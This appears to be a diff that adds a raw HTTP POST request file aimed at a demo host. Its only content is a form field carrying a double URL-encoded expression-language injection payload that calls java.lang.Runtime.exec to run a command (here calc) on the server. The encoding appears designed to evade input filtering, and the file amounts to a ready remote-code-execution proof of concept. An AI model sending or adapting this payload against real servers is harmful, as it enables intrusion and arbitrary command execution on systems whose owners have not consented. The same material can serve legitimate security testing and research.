@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 98
+Connection: close
+
+page=%2523%257BT%2528java.lang.Runtime%2529.getRuntime%2528%2529.exec%2528%2527calc%2527%2529%257D
